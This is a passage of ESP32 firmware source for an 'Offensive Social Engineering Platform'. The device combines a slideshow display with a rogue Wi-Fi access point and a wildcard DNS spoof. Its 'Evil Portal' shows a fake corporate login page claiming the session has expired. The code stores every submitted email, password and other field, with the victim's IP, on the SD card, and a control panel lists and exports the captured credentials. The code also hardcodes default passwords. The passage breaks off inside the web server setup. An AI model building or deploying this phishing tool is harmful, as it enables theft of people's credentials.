// ================== OSEP-32 (SYH2) v2.0 ==================
// Offensive Social Engineering Platform
// Slideshow + Evil Portal com captura de credenciais
#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPI.h>
#include <SD.h>
#include <TFT_eSPI.h>
#include <TJpg_Decoder.h>
#include <ESP32FtpServer.h>

TFT_eSPI tft = TFT_eSPI();
AsyncWebServer server(80);
FtpServer ftpSrv;
DNSServer dnsServer;

SemaphoreHandle_t sdMutex;

static const int SD_CS  = 5;
static const int BL_PIN = 21;

// ===== Caminhos =====
static const char* SLIDES_DIR    = "/slides";
static const char* ORDER_FILE    = "/slides/order.txt";
static const char* CONFIG_FILE   = "/config.txt";
static const char* CREDS_FILE    = "/creds.csv";
static const char* PORTAL_FILE   = "/portal.html";

// ===== AP =====
const char* WIFI_AP_SSID = "OSEP-32(SYH2)";
const char* WIFI_AP_PASS = "solydsyh2";
static const byte DNS_PORT = 53;

// ===== Config =====
String   cfg_sta_ssid    = "";
String   cfg_sta_pass    = "";
String   cfg_panel_pass  = "solyd";
String   cfg_ftp_user    = "osep";
String   cfg_ftp_pass    = "osep1234";
uint8_t  cfg_brightness  = 255;
uint32_t cfg_slide_delay = 4000;

// ===== Estado =====
bool   wifiStaOk      = false;
String webAddress     = "";
bool   forceShowNow   = false;
String forceShowName  = "";
volatile bool ftpDirty      = false;
bool slideshowPaused  = false;
bool evilPortalActive = false;

static const int MAX_FILES = 200;
String images[MAX_FILES];
String found[MAX_FILES];
int imageCount   = 0;
int currentIndex = 0;

static const int BL_FREQ = 5000;
static const int BL_RES  = 8;

// ===== Auth =====
bool isAuthenticated(AsyncWebServerRequest *request) {
  if (!request->hasParam("token")) return false;
  return request->getParam("token")->value() == cfg_panel_pass;
}

bool isAuthPost(AsyncWebServerRequest *request) {
  if (!request->hasParam("token", true)) return false;
  return request->getParam("token", true)->value() == cfg_panel_pass;
}

// ===== JPEG callback =====
bool tft_output(int16_t x, int16_t y, uint16_t w, uint16_t h, uint16_t* bitmap) {
  if (y >= tft.height()) return false;
  tft.pushImage(x, y, w, h, bitmap);
  return true;
}

// ===== Utils =====
void setBrightness(uint8_t b) {
  cfg_brightness = b;
  ledcWrite(BL_PIN, b);
}

bool isJpg(const String& n) {
  String s = n; s.toLowerCase();
  return s.endsWith(".jpg") || s.endsWith(".jpeg");
}

bool existsInArray(String arr[], int count, const String& value) {
  for (int i = 0; i < count; i++) if (arr[i] == value) return true;
  return false;
}

void sortArray(String arr[], int count) {
  for (int i = 0; i < count - 1; i++)
    for (int j = 0; j < count - i - 1; j++)
      if (arr[j] > arr[j+1]) { String t = arr[j]; arr[j] = arr[j+1]; arr[j+1] = t; }
}

String jsonEscape(const String& s) {
  String out;
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if (c == '\\' || c == '"') out += '\\';
    out += c;
  }
  return out;
}

String htmlEscape(const String& s) {
  String out;
  for (size_t i = 0; i < s.length(); i++) {
    char c = s[i];
    if      (c == '<')  out += "&lt;";
    else if (c == '>')  out += "&gt;";
    else if (c == '"')  out += "&quot;";
    else if (c == '\'') out += "&#39;";
    else if (c == '&')  out += "&amp;";
    else                out += c;
  }
  return out;
}

// ===== Config (sem mutex — chamador gerencia) =====
void saveConfig() {
  if (SD.exists(CONFIG_FILE)) SD.remove(CONFIG_FILE);
  File f = SD.open(CONFIG_FILE, FILE_WRITE);
  if (!f) return;
  f.println("ssid="        + cfg_sta_ssid);
  f.println("pass="        + cfg_sta_pass);
  f.println("panel_pass="  + cfg_panel_pass);
  f.println("ftp_user="    + cfg_ftp_user);
  f.println("ftp_pass="    + cfg_ftp_pass);
  f.println("brightness="  + String(cfg_brightness));
  f.println("slide_delay=" + String(cfg_slide_delay));
  f.close();
}

void loadConfig() {
  if (!SD.exists(CONFIG_FILE)) { saveConfig(); return; }
  File f = SD.open(CONFIG_FILE, FILE_READ);
  if (!f) return;
  while (f.available()) {
    String line = f.readStringUntil('\n'); line.trim();
    int eq = line.indexOf('=');
    if (eq <= 0) continue;
    String key = line.substring(0, eq);
    String val = line.substring(eq + 1);
    if      (key == "ssid")        cfg_sta_ssid    = val;
    else if (key == "pass")        cfg_sta_pass    = val;
    else if (key == "panel_pass")  cfg_panel_pass  = val;
    else if (key == "ftp_user")    cfg_ftp_user    = val;
    else if (key == "ftp_pass")    cfg_ftp_pass    = val;
    else if (key == "brightness")  cfg_brightness  = (uint8_t)  constrain(val.toInt(), 1, 255);
    else if (key == "slide_delay") cfg_slide_delay = (uint32_t) constrain(val.toInt(), 1000, 30000);
  }
  f.close();
}

// ===== Ordem (sem mutex) =====
void saveOrder() {
  if (SD.exists(ORDER_FILE)) SD.remove(ORDER_FILE);
  File f = SD.open(ORDER_FILE, FILE_WRITE);
  if (!f) return;
  for (int i = 0; i < imageCount; i++) f.println(images[i]);
  f.close();
}

// ===== Imagens =====
void loadImagesFromSD() {
  if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(5000)) != pdTRUE) return;
  imageCount = 0;
  if (!SD.exists(SLIDES_DIR)) SD.mkdir(SLIDES_DIR);
  int foundCount = 0;
  for (int i = 0; i < MAX_FILES; i++) found[i] = "";
  File dir = SD.open(SLIDES_DIR);
  while (true) {
    File f = dir.openNextFile();
    if (!f) break;
    if (!f.isDirectory()) {
      String name = String(f.name());
      if (!name.endsWith("order.txt") && isJpg(name))
        if (foundCount < MAX_FILES) found[foundCount++] = name;
    }
    f.close();
  }
  dir.close();
  sortArray(found, foundCount);
  if (!SD.exists(ORDER_FILE)) {
    for (int i = 0; i < foundCount; i++) images[imageCount++] = found[i];
    saveOrder(); xSemaphoreGive(sdMutex); return;
  }
  File ord = SD.open(ORDER_FILE, FILE_READ);
  if (!ord) {
    for (int i = 0; i < foundCount; i++) images[imageCount++] = found[i];
    xSemaphoreGive(sdMutex); return;
  }
  while (ord.available()) {
    String line = ord.readStringUntil('\n'); line.trim();
    if (line.length() > 0 && existsInArray(found, foundCount, line))
      if (imageCount < MAX_FILES && !existsInArray(images, imageCount, line))
        images[imageCount++] = line;
  }
  ord.close();
  for (int i = 0; i < foundCount; i++)
    if (!existsInArray(images, imageCount, found[i]))
      if (imageCount < MAX_FILES) images[imageCount++] = found[i];
  saveOrder();
  xSemaphoreGive(sdMutex);
}

void moveImage(int from, int to) {
  if (from < 0 || from >= imageCount || to < 0 || to >= imageCount || from == to) return;
  String tmp = images[from];
  if (from < to) for (int i = from; i < to; i++) images[i] = images[i+1];
  else           for (int i = from; i > to; i--) images[i] = images[i-1];
  images[to] = tmp;
  if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(3000)) == pdTRUE) { saveOrder(); xSemaphoreGive(sdMutex); }
}

void deleteImageByName(const String& name) {
  String path = String(SLIDES_DIR) + "/" + name;
  if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(3000)) == pdTRUE) {
    if (SD.exists(path.c_str())) SD.remove(path.c_str());
    xSemaphoreGive(sdMutex);
  }
  int pos = -1;
  for (int i = 0; i < imageCount; i++) if (images[i] == name) { pos = i; break; }
  if (pos >= 0) {
    for (int i = pos; i < imageCount - 1; i++) images[i] = images[i+1];
    imageCount--;
  }
  if (currentIndex >= imageCount) currentIndex = max(0, imageCount - 1);
  if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(3000)) == pdTRUE) { saveOrder(); xSemaphoreGive(sdMutex); }
}

// ===== TFT =====
void drawStatusOverlay(const String& line1, const String& line2 = "") {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_RED, TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(8, 10);
  tft.print(line1);
  if (line2.length()) {
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(8, 40);
    tft.print(line2);
  }
}

void drawImageByName(const String& name) {
  static bool busy = false;
  if (busy) return;
  if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(2000)) != pdTRUE) return;
  busy = true;
  tft.fillScreen(TFT_BLACK);
  String path = String(SLIDES_DIR) + "/" + name;
  File f = SD.open(path.c_str(), FILE_READ);
  if (!f) { busy = false; xSemaphoreGive(sdMutex); return; }
  TJpgDec.drawSdJpg(0, 0, f);
  f.close();
  busy = false;
  xSemaphoreGive(sdMutex);
}

// ===== Evil Portal — credenciais =====

// Salva uma captura em /creds.csv
// Formato: timestamp_ms,ip,campo1=valor1|campo2=valor2...
void saveCredential(const String& ip, AsyncWebServerRequest *request) {
  if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(3000)) != pdTRUE) return;
  bool newFile = !SD.exists(CREDS_FILE);
  File f = SD.open(CREDS_FILE, FILE_APPEND);
  if (!f) { xSemaphoreGive(sdMutex); return; }
  if (newFile) f.println("timestamp,ip,dados");
  String row = String(millis()) + "," + ip + ",";
  int params = request->params();
  bool first = true;
  for (int i = 0; i < params; i++) {
    const AsyncWebParameter* p = request->getParam(i);
    // exclui campos internos de controle
    if (p->name() == "token") continue;
    if (!first) row += "|";
    row += p->name() + "=" + p->value();
    first = false;
  }
  f.println(row);
  f.close();
  xSemaphoreGive(sdMutex);
}

// Lê /creds.csv e devolve como JSON array de objetos
String buildCredsJson() {
  String json = "[";
  if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(3000)) != pdTRUE) return "[]";
  if (!SD.exists(CREDS_FILE)) { xSemaphoreGive(sdMutex); return "[]"; }
  File f = SD.open(CREDS_FILE, FILE_READ);
  if (!f) { xSemaphoreGive(sdMutex); return "[]"; }
  bool header = true;
  bool firstRow = true;
  while (f.available()) {
    String line = f.readStringUntil('\n'); line.trim();
    if (header) { header = false; continue; } // pula cabeçalho
    if (line.length() == 0) continue;
    // parse: timestamp,ip,dados
    int c1 = line.indexOf(',');
    int c2 = line.indexOf(',', c1 + 1);
    if (c1 < 0 || c2 < 0) continue;
    String ts   = line.substring(0, c1);
    String ip   = line.substring(c1 + 1, c2);
    String data = line.substring(c2 + 1);
    if (!firstRow) json += ",";
    json += "{\"ts\":\"" + jsonEscape(ts) + "\",\"ip\":\"" + jsonEscape(ip) + "\",\"data\":\"" + jsonEscape(data) + "\"}";
    firstRow = false;
  }
  f.close();
  xSemaphoreGive(sdMutex);
  json += "]";
  return json;
}

// Página de portal padrão embutida (usada quando não há /portal.html no SD)
String defaultPortalPage() {
  return R"HTML(<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Portal do Colaborador</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{min-height:100vh;background:#f5f5f5;display:flex;align-items:center;justify-content:center;font-family:Arial}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);padding:36px 32px;width:340px}
.logo{text-align:center;margin-bottom:24px}
.logo-box{display:inline-block;background:#003087;color:#fff;font-size:20px;font-weight:700;padding:10px 22px;border-radius:4px;letter-spacing:1px}
h2{font-size:16px;color:#333;margin-bottom:4px;text-align:center}
.sub{font-size:13px;color:#888;text-align:center;margin-bottom:22px}
label{display:block;font-size:13px;color:#555;margin-bottom:4px;margin-top:14px}
input{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:14px}
button{width:100%;padding:11px;background:#003087;color:#fff;border:none;border-radius:4px;font-size:15px;margin-top:20px;cursor:pointer}
.note{font-size:11px;color:#aaa;text-align:center;margin-top:14px}
</style>
</head>
<body>
<div class="card">
  <div class="logo"><span class="logo-box">CORP</span></div>
  <h2>Portal do Colaborador</h2>
  <p class="sub">Sessão expirada &mdash; faça login novamente</p>
  <form action="/capture" method="POST">
    <label>E-mail corporativo</label>
    <input type="email" name="email" placeholder="usuario@empresa.com.br" required>
    <label>Senha</label>
    <input type="password" name="senha" required>
    <button type="submit">Entrar</button>
  </form>
  <p class="note">© Corporativo &mdash; portal v3.1 &mdash; acesso restrito</p>
</div>
</body>
</html>)HTML";
}

// Página de sucesso (após captura)
String captureSuccessPage() {
  return R"HTML(<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="4;url=/">
<title>Autenticando...</title>
<style>
body{min-height:100vh;background:#f5f5f5;display:flex;align-items:center;justify-content:center;font-family:Arial}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);padding:36px 32px;width:300px;text-align:center}
.spinner{width:36px;height:36px;border:4px solid #e0e0e0;border-top:4px solid #003087;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 18px}
@keyframes spin{to{transform:rotate(360deg)}}
p{color:#555;font-size:14px}
</style>
</head>
<body>
<div class="card">
  <div class="spinner"></div>
  <p>Autenticando...</p>
  <p style="font-size:12px;color:#aaa;margin-top:8px">Você será redirecionado em instantes.</p>
</div>
</body>
</html>)HTML";
}

// ===== Wi-Fi =====
void startWifi() {
  WiFi.mode(WIFI_AP_STA);
  wifiStaOk = false;
  if (cfg_sta_ssid.length() > 0) {
    WiFi.begin(cfg_sta_ssid.c_str(), cfg_sta_pass.c_str());
    uint32_t start = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - start < 12000) delay(500);
    if (WiFi.status() == WL_CONNECTED) { wifiStaOk = true; webAddress = WiFi.localIP().toString(); }
  }
  WiFi.softAP(WIFI_AP_SSID, WIFI_AP_PASS);
  if (!wifiStaOk) webAddress = WiFi.softAPIP().toString();
}

void startFtp() {
  if (!SD.exists("/slides")) SD.mkdir("/slides");
  ftpSrv.begin(cfg_ftp_user.c_str(), cfg_ftp_pass.c_str());
}

// ===== DNS spoof =====
void startDns() {
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
}

// ===== JSON list =====
String buildJsonList() {
  String json = "[";
  for (int i = 0; i < imageCount; i++) {
    if (i > 0) json += ",";
    json += "{\"name\":\"" + jsonEscape(images[i]) + "\",\"index\":" + String(i) + "}";
  }
  json += "]";
  return json;
}

// ===== HTML Pages =====
String loginPage() {
  return R"HTML(<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OSEP-32 Login</title>
<style>
body{margin:0;background:#0a0a0a;color:#fff;font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh}
.box{background:#111;border:1px solid #2a2a2a;border-radius:16px;padding:24px;width:320px}
h2{margin-top:0;color:#c1121f}
input,button{width:100%;padding:10px;border-radius:10px;border:1px solid #333;margin-top:10px;font-size:14px;box-sizing:border-box}
input{background:#0f0f0f;color:#fff}
button{background:#c1121f;color:#fff;border:none;cursor:pointer}
.small{font-size:12px;color:#aaa;margin-top:10px}
</style>
</head>
<body>
<div class="box">
  <h2>Offensive Social Engineering Platform</h2>
  <form action="/panel" method="GET">
    <input type="password" name="token" placeholder="Senha do painel">
    <button type="submit">Entrar</button>
  </form>
  <div class="small">Acesso protegido</div>
</div>
</body>
</html>)HTML";
}

String panelPage() {
  return R"HTML(<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Offensive Social Engineering Platform</title>
<style>
:root{--panel:#111;--panel2:#151515;--line:#2c2c2c;--red:#c1121f;--red2:#7f0b14;--txt:#f0f0f0;--muted:#9a9a9a;--green:#1a7a1a;--green2:#0d4d0d}
*{box-sizing:border-box}
body{margin:0;background:linear-gradient(180deg,#050505,#101010);color:var(--txt);font-family:Arial}
.wrap{max-width:1200px;margin:0 auto;padding:20px}
.hero{background:radial-gradient(circle at top right,#240000 0%,#121212 40%,#090909 100%);border:1px solid var(--line);border-radius:18px;padding:20px;margin-bottom:18px}
.title{font-size:28px;font-weight:700;color:#fff}
.sub{margin-top:6px;color:var(--muted)}
.card{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:16px;margin-bottom:18px}
h3{margin:0 0 12px}
.tabs{display:flex;gap:4px;margin-bottom:18px}
.tab{padding:8px 18px;border-radius:10px;border:1px solid var(--line);background:var(--panel2);cursor:pointer;font-size:14px;color:var(--muted)}
.tab.active{background:var(--red);border-color:var(--red);color:#fff}
.page{display:none}.page.active{display:block}
input[type=text],input[type=password],input[type=number]{width:100%;padding:10px;background:#0f0f0f;border:1px solid #333;border-radius:10px;color:#fff;font-size:14px}
button{background:linear-gradient(180deg,var(--red),var(--red2));color:#fff;border:none;padding:9px 12px;border-radius:10px;cursor:pointer;font-size:14px}
button.sec{background:#222;border:1px solid #3a3a3a}
button.green{background:linear-gradient(180deg,var(--green),var(--green2))}
button.danger{background:linear-gradient(180deg,#8b0000,#5c0000)}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:14px}
.item{background:var(--panel2);border:1px solid #2b2b2b;border-radius:14px;padding:10px}
.thumb{width:100%;height:130px;object-fit:cover;background:#000;border-radius:10px;border:1px solid #3a3a3a}
.name{font-size:12px;word-break:break-all;margin:8px 0}
.row{display:flex;gap:6px;flex-wrap:wrap}
.status{margin-top:10px;font-size:13px;color:#9fd}
.small{color:#aaa;font-size:12px;margin-top:8px}
.ftp-box{background:#0d1a0d;border:1px solid #1a3a1a;border-radius:12px;padding:14px}
.ftp-box code{color:#4caf50;font-size:13px;display:block;margin-top:4px}
.cols{display:grid;grid-template-columns:1fr 1fr;gap:18px}
@media(max-width:900px){.cols{grid-template-columns:1fr}}
label{display:block;margin-top:10px;font-size:13px;color:var(--muted)}
/* Evil portal toggle */
.ep-box{background:#1a0000;border:1px solid #4a0000;border-radius:12px;padding:16px;margin-bottom:12px}
.ep-active{background:#001a00;border-color:#004a00}
.badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:12px;font-weight:700}
.badge.off{background:#3a0000;color:#ff6666}
.badge.on{background:#003a00;color:#66ff66}
/* Creds table */
.creds-table{width:100%;border-collapse:collapse;font-size:13px;margin-top:12px}
.creds-table th{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);color:var(--muted)}
.creds-table td{padding:8px 10px;border-bottom:1px solid #1a1a1a;word-break:break-all}
.creds-table tr:hover td{background:#1a1a1a}
.empty-creds{text-align:center;color:var(--muted);padding:30px;font-size:14px}
</style>
</head>
<body>
<div class="wrap">
  <div class="hero">
    <div class="title">Offensive Social Engineering Platform (SYH2)</div>
    <div class="sub">Wi-Fi: __MODE__ &bull; __ADDR__</div>
  </div>

  <div class="tabs">
    <div class="tab active" onclick="switchTab('slideshow')">Slideshow</div>
    <div class="tab" onclick="switchTab('portal')">Evil Portal</div>
    <div class="tab" onclick="switchTab('creds')">Credenciais</div>
    <div class="tab" onclick="switchTab('config')">Configurações</div>
  </div>

  <!-- ===== ABA SLIDESHOW ===== -->
  <div id="page-slideshow" class="page active">
    <div class="cols">
      <div>
        <div class="card">
          <h3>Envio via FTP</h3>
          <div class="ftp-box">
            <div>Host: <code>__ADDR__</code></div>
            <div>Porta: <code>21</code></div>
            <div>Diretório: <code>/slides</code></div>
          </div>
          <div class="small">Use FileZilla ou WinSCP. Envie JPGs para /slides.</div>
          <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
            <button onclick="reloadGallery()">&#8635; Atualizar galeria</button>
            <button id="pauseBtn" class="sec" onclick="togglePause()">&#9646;&#9646; Pausar slideshow</button>
          </div>
          <div id="reloadStatus" class="status"></div>
        </div>
      </div>
      <div>
        <div class="card">
          <h3>Campanhas Phishing &mdash; imagens</h3>
          <div id="gallery" class="grid"></div>
        </div>
      </div>
    </div>
  </div>

  <!-- ===== ABA EVIL PORTAL ===== -->
  <div id="page-portal" class="page">
    <div class="card">
      <h3>Evil Portal / Captive Portal</h3>
      <div id="epBox" class="ep-box">
        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap">
          <span>Status: <span id="epBadge" class="badge off">INATIVO</span></span>
          <button id="epBtn" onclick="togglePortal()">Ativar Evil Portal</button>
        </div>
        <div class="small" style="margin-top:10px">
          Quando ativo, qualquer dispositivo conectado ao AP é redirecionado para a página de phishing.
          O slideshow continua em exibição normalmente e o portal captura credenciais em segundo plano.
        </div>
      </div>

      <h3 style="margin-top:16px">Página do portal</h3>
      <div class="small" style="margin-bottom:10px">
        Carregue um arquivo <code>portal.html</code> na raiz do SD via FTP para substituir a página padrão.
        Os formulários devem enviar via <code>POST /capture</code> para capturar credenciais.
      </div>
      <div class="ftp-box">
        <div>Host: <code>__ADDR__</code></div>
        <div>Porta: <code>21</code></div>
        <div>Arquivo: <code>/portal.html</code></div>
        <div>Endpoint de captura: <code>POST /capture</code></div>
      </div>
      <div class="small" style="margin-top:10px">
        O formulário pode ter qualquer campo — todos são capturados automaticamente (nome, e-mail, senha, etc.).
        Exemplo mínimo de form: <code>&lt;form action="/capture" method="POST"&gt;</code>
      </div>
    </div>
  </div>

  <!-- ===== ABA CREDENCIAIS ===== -->
  <div id="page-creds" class="page">
    <div class="card">
      <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:16px">
        <h3 style="margin:0">Credenciais capturadas</h3>
        <button onclick="loadCreds()" class="sec" style="padding:6px 12px">&#8635; Atualizar</button>
        <button onclick="downloadCreds()" class="sec" style="padding:6px 12px">&#8595; Download CSV</button>
        <button onclick="clearCreds()" class="danger" style="padding:6px 12px">&#128465; Limpar</button>
      </div>
      <div id="credsContainer">
        <div class="empty-creds">Carregando...</div>
      </div>
    </div>
  </div>

  <!-- ===== ABA CONFIG ===== -->
  <div id="page-config" class="page">
    <div class="card">
      <h3>Configurações</h3>
      <label>SSID Wi-Fi</label>
      <input type="text" id="wifi_ssid" value="__SSID__">
      <label>Senha Wi-Fi</label>
      <input type="password" id="wifi_pass" value="__WIFIPASS__">
      <label>Senha do painel</label>
      <input type="password" id="panel_pass" value="__PANELPASS__">
      <label>Usuário FTP</label>
      <input type="text" id="ftp_user" value="__FTP_USER__">
      <label>Senha FTP</label>
      <input type="password" id="ftp_pass" value="__FTP_PASS__">
      <label>Brilho (1-255)</label>
      <input type="number" id="brightness" min="1" max="255" value="__BRIGHT__">
      <label>Delay slideshow (ms)</label>
      <input type="number" id="slide_delay" min="1000" max="30000" value="__DELAY__">
      <div style="margin-top:12px;display:flex;gap:8px;flex-wrap:wrap">
        <button onclick="saveConfig()">Salvar</button>
        <button class="sec" onclick="rebootDevice()">Reiniciar</button>
      </div>
      <div id="cfgStatus" class="status"></div>
    </div>
  </div>
</div>

<script>
const TOKEN = '__TOKEN__';
let epActive = __EP_ACTIVE__;

function switchTab(name) {
  document.querySelectorAll('.tab').forEach((t,i) => {
    const pages = ['slideshow','portal','creds','config'];
    t.classList.toggle('active', pages[i] === name);
    document.getElementById('page-'+pages[i]).classList.toggle('active', pages[i] === name);
  });
  if (name === 'creds') loadCreds();
}

// ===== Slideshow =====
async function loadList() {
  const res = await fetch('/api/list?token=' + encodeURIComponent(TOKEN));
  const data = await res.json();
  const gallery = document.getElementById('gallery');
  gallery.innerHTML = '';
  data.forEach((item, i) => {
    const div = document.createElement('div'); div.className = 'item';
    const img = document.createElement('img'); img.className = 'thumb';
    img.src = '/img?token=' + encodeURIComponent(TOKEN) + '&name=' + encodeURIComponent(item.name) + '&t=' + Date.now();
    const nm = document.createElement('div'); nm.className = 'name'; nm.textContent = (i+1) + '. ' + item.name;
    const row = document.createElement('div'); row.className = 'row';
    const showBtn = document.createElement('button'); showBtn.textContent = 'Mostrar';
    showBtn.onclick = () => fetch('/api/show',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'token='+encodeURIComponent(TOKEN)+'&name='+encodeURIComponent(item.name)});
    const upBtn = document.createElement('button'); upBtn.className='sec'; upBtn.textContent='↑';
    upBtn.onclick = async () => { await fetch('/api/move',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'token='+encodeURIComponent(TOKEN)+'&from='+i+'&to='+Math.max(0,i-1)}); loadList(); };
    const dnBtn = document.createElement('button'); dnBtn.className='sec'; dnBtn.textContent='↓';
    dnBtn.onclick = async () => { await fetch('/api/move',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'token='+encodeURIComponent(TOKEN)+'&from='+i+'&to='+Math.min(data.length-1,i+1)}); loadList(); };
    const delBtn = document.createElement('button'); delBtn.className='sec'; delBtn.textContent='Excluir';
    delBtn.onclick = async () => { if(!confirm('Excluir '+item.name+'?')) return; await fetch('/api/delete',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'token='+encodeURIComponent(TOKEN)+'&name='+encodeURIComponent(item.name)}); loadList(); };
    row.appendChild(showBtn); row.appendChild(upBtn); row.appendChild(dnBtn); row.appendChild(delBtn);
    div.appendChild(img); div.appendChild(nm); div.appendChild(row);
    gallery.appendChild(div);
  });
}

async function reloadGallery() {
  await fetch('/api/reload',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'token='+encodeURIComponent(TOKEN)});
  document.getElementById('reloadStatus').textContent = 'Atualizando...';
  setTimeout(() => { loadList(); document.getElementById('reloadStatus').textContent = ''; }, 1800);
}

async function togglePause() {
  const res = await fetch('/api/pause',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'token='+encodeURIComponent(TOKEN)});
  const state = await res.text();
  const btn = document.getElementById('pauseBtn');
  if (state === 'paused') {
    btn.textContent = '▶ Retomar slideshow'; btn.style.background='#1a5c1a'; btn.style.border='1px solid #2a8a2a';
  } else {
    btn.textContent = '⏸ Pausar slideshow'; btn.style.background=''; btn.style.border=''; btn.className='sec';
  }
}

// ===== Evil Portal =====
function updateEpUI() {
  const badge = document.getElementById('epBadge');
  const btn   = document.getElementById('epBtn');
  const box   = document.getElementById('epBox');
  badge.textContent = epActive ? 'ATIVO' : 'INATIVO';
  badge.className = 'badge ' + (epActive ? 'on' : 'off');
  btn.textContent = epActive ? 'Desativar Evil Portal' : 'Ativar Evil Portal';
  btn.className = epActive ? 'danger' : '';
  box.className = 'ep-box ' + (epActive ? 'ep-active' : '');
}

async function togglePortal() {
  const res = await fetch('/api/portal',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'token='+encodeURIComponent(TOKEN)});
  const state = await res.text();
  epActive = (state === 'active');
  updateEpUI();
}

// ===== Credenciais =====
async function loadCreds() {
  const container = document.getElementById('credsContainer');
  container.innerHTML = '<div class="empty-creds">Carregando...</div>';
  const res = await fetch('/api/creds?token=' + encodeURIComponent(TOKEN));
  const data = await res.json();
  if (!data || data.length === 0) {
    container.innerHTML = '<div class="empty-creds">Nenhuma credencial capturada ainda.</div>';
    return;
  }
  let html = '<table class="creds-table"><thead><tr><th>#</th><th>Timestamp (ms)</th><th>IP</th><th>Dados capturados</th></tr></thead><tbody>';
  data.forEach((row, i) => {
    const campos = row.data.split('|').map(p => {
      const [k, ...v] = p.split('=');
      return '<b>' + k + '</b>: ' + v.join('=');
    }).join('<br>');
    html += '<tr><td>' + (i+1) + '</td><td>' + row.ts + '</td><td>' + row.ip + '</td><td>' + campos + '</td></tr>';
  });
  html += '</tbody></table>';
  container.innerHTML = html;
}

async function downloadCreds() {
  window.location.href = '/api/creds/download?token=' + encodeURIComponent(TOKEN);
}

async function clearCreds() {
  if (!confirm('Apagar todas as credenciais capturadas? Esta ação não pode ser desfeita.')) return;
  await fetch('/api/creds/clear',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'token='+encodeURIComponent(TOKEN)});
  loadCreds();
}

// ===== Config =====
async function saveConfig() {
  const body = 'token='+encodeURIComponent(TOKEN)
    +'&wifi_ssid='+encodeURIComponent(document.getElementById('wifi_ssid').value)
    +'&wifi_pass='+encodeURIComponent(document.getElementById('wifi_pass').value)
    +'&panel_pass='+encodeURIComponent(document.getElementById('panel_pass').value)
    +'&ftp_user='+encodeURIComponent(document.getElementById('ftp_user').value)
    +'&ftp_pass='+encodeURIComponent(document.getElementById('ftp_pass').value)
    +'&brightness='+encodeURIComponent(document.getElementById('brightness').value)
    +'&slide_delay='+encodeURIComponent(document.getElementById('slide_delay').value);
  const res = await fetch('/api/config',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body});
  document.getElementById('cfgStatus').textContent = await res.text();
}

async function rebootDevice() {
  await fetch('/api/reboot',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'token='+encodeURIComponent(TOKEN)});
  document.getElementById('cfgStatus').textContent = 'Reiniciando...';
}

updateEpUI();
loadList();
</script>
</body>
</html>)HTML";
}

String buildPanelPage(const String& token) {
  String html = panelPage();
  html.replace("__MODE__",      wifiStaOk ? "STA + AP" : "AP");
  html.replace("__ADDR__",      webAddress);
  html.replace("__TOKEN__",     token);
  html.replace("__SSID__",      cfg_sta_ssid);
  html.replace("__WIFIPASS__",  cfg_sta_pass);
  html.replace("__PANELPASS__", cfg_panel_pass);
  html.replace("__FTP_USER__",  cfg_ftp_user);
  html.replace("__FTP_PASS__",  cfg_ftp_pass);
  html.replace("__BRIGHT__",    String(cfg_brightness));
  html.replace("__DELAY__",     String(cfg_slide_delay));
  html.replace("__EP_ACTIVE__", evilPortalActive ? "true" : "false");
  return html;
}

// ===== Web =====
void startWeb() {
  // Login
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    // Captive portal: se evil portal ativo e requisição não for do painel, serve o portal
    if (evilPortalActive && !request->hasParam("token")) {
      if (xSemaphoreTake(sdMutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
        if (SD.exists(PORTAL_FILE)) {
          AsyncWebServerResponse* resp = request->beginResponse(SD, PORTAL_FILE, "text/html");
          xSemaphoreGive(sdMutex);
          request->send(resp);
          return;
        }
        xSemaphoreGive(sdMutex);
      }
      request->send(200, "text/html; charset=utf-8", defaultPortalPage());
      return;
    }
